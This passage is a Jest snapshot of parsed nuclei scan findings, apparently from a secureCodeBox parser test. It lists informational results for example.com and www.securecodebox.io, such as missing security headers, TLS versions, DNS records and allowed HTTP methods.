      "path": null,
      "reference": Array [
        "https://www.theregister.com/2021/02/24/dns_cname_tracking/",
        "https://www.ionos.com/digitalguide/hosting/technical-matters/cname-record/",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "dns",
        "cname",
      ],
      "template": "dns/cname-fingerprint.yaml",
      "template_id": "cname-fingerprint",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/dns/cname-fingerprint.yaml",
      "timestamp": "2022-09-09T21:27:25.325591+02:00",
      "type": "dns",
    },
    "category": "cname-fingerprint",
    "description": "A CNAME DNS record was discovered.",
    "location": "https://www.securecodebox.io",
    "name": "CNAME Fingerprint",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "TLS13",
      ],
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "ssl",
      ],
      "template": "ssl/tls-version.yaml",
      "template_id": "tls-version",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/tls-version.yaml",
      "timestamp": "2022-09-09T21:27:53.046678+02:00",
      "type": "ssl",
    },
    "category": "tls-version",
    "description": "The name of the nuclei rule which triggered the finding: tls-version",
    "location": "https://www.securecodebox.io",
    "name": "TLS Version",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "docs.securecodebox.io",
        "www.securecodebox.io",
      ],
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "ssl",
      ],
      "template": "ssl/ssl-dns-names.yaml",
      "template_id": "ssl-dns-names",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/ssl-dns-names.yaml",
      "timestamp": "2022-09-09T21:28:02.187683+02:00",
      "type": "ssl",
    },
    "category": "ssl-dns-names",
    "description": "The name of the nuclei rule which triggered the finding: ssl-dns-names",
    "location": "https://www.securecodebox.io",
    "name": "SSL DNS Names",
    "severity": "INFORMATIONAL",
  },
]
`;

exports[`parses the example.com result correctly 1`] = `
Array [
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "content-security-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.271592+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "x-permitted-cross-domain-policies",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.272231+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "clear-site-data",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.272358+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "access-control-allow-credentials",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.27242+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "access-control-allow-headers",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.272488+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "permission-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.272559+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "cross-origin-embedder-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.292757+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "cross-origin-resource-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293626+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "access-control-allow-origin",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293711+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "access-control-expose-headers",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293768+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "access-control-max-age",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293798+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "strict-transport-security",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293859+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "x-frame-options",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293899+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "x-content-type-options",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293924+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "referrer-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293951+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "cross-origin-opener-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.293979+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://example.com'",
      "extracted_results": null,
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": "access-control-allow-methods",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:18:55.294616+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://example.com",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "example.net",
        "example.edu",
        "example.com",
        "example.org",
        "www.example.com",
        "www.example.edu",
        "www.example.net",
        "www.example.org",
      ],
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "ssl",
      ],
      "template": "ssl/ssl-dns-names.yaml",
      "template_id": "ssl-dns-names",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/ssl-dns-names.yaml",
      "timestamp": "2022-09-09T21:18:55.401569+02:00",
      "type": "ssl",
    },
    "category": "ssl-dns-names",
    "description": "The name of the nuclei rule which triggered the finding: ssl-dns-names",
    "location": "https://example.com",
    "name": "SSL DNS Names",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": "curl -X 'OPTIONS' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36' 'https://example.com'",
      "extracted_results": Array [
        "OPTIONS, GET, HEAD, POST",
      ],
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misc",
        "generic",
      ],
      "template": "miscellaneous/options-method.yaml",
      "template_id": "options-method",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/miscellaneous/options-method.yaml",
      "timestamp": "2022-09-09T21:19:38.295229+02:00",
      "type": "http",
    },
    "category": "options-method",
    "description": "The name of the nuclei rule which triggered the finding: options-method",
    "location": "https://example.com",
    "name": "Allowed Options Method",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "righettod",
        "forgedhallpass",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "TLS10",
      ],
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": Object {
        "shodan-query": "ssl.version:sslv2 ssl.version:sslv3 ssl.version:tlsv1 ssl.version:tlsv1.1",
      },
      "path": null,
      "reference": Array [
        "https://ssl-config.mozilla.org/#config=intermediate",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "ssl",
      ],
      "template": "ssl/deprecated-tls.yaml",
      "template_id": "deprecated-tls",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/deprecated-tls.yaml",
      "timestamp": "2022-09-09T21:20:23.43205+02:00",
      "type": "ssl",
    },
    "category": "deprecated-tls",
    "description": "Both TLS 1.1 and SSLv3 are deprecated in favor of stronger encryption.
",
    "location": "https://example.com",
    "name": "Deprecated TLS Detection (TLS 1.1 or SSLv3)",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "righettod",
        "forgedhallpass",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "TLS11",
      ],
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": Object {
        "shodan-query": "ssl.version:sslv2 ssl.version:sslv3 ssl.version:tlsv1 ssl.version:tlsv1.1",
      },
      "path": null,
      "reference": Array [
        "https://ssl-config.mozilla.org/#config=intermediate",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "ssl",
      ],
      "template": "ssl/deprecated-tls.yaml",
      "template_id": "deprecated-tls",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/deprecated-tls.yaml",
      "timestamp": "2022-09-09T21:20:23.731779+02:00",
      "type": "ssl",
    },
    "category": "deprecated-tls",
    "description": "Both TLS 1.1 and SSLv3 are deprecated in favor of stronger encryption.
",
    "location": "https://example.com",
    "name": "Deprecated TLS Detection (TLS 1.1 or SSLv3)",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "a.iana-servers.net.",
        "b.iana-servers.net.",
      ],
      "hostname": "example.com",
      "ip": null,
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "dns",
        "ns",
      ],
      "template": "dns/nameserver-fingerprint.yaml",
      "template_id": "nameserver-fingerprint",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/dns/nameserver-fingerprint.yaml",
      "timestamp": "2022-09-09T21:20:29.548052+02:00",
      "type": "dns",
    },
    "category": "nameserver-fingerprint",
    "description": "An NS record was detected. An NS record delegates a subdomain to a set of name servers.",
    "location": "https://example.com",
    "name": "NS Record Detection",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "31406 8 1 189968811E6EBA862DD6C209F75623D8D9ED9142",
        "31406 8 2 F78CF3344F72137235098ECBBD08947C2C9001C7F6A085A17F518B5D8F6B916D",
        "31589 8 1 3490A6806D47F17A34C29E2CE80E8A999FFBE4BE",
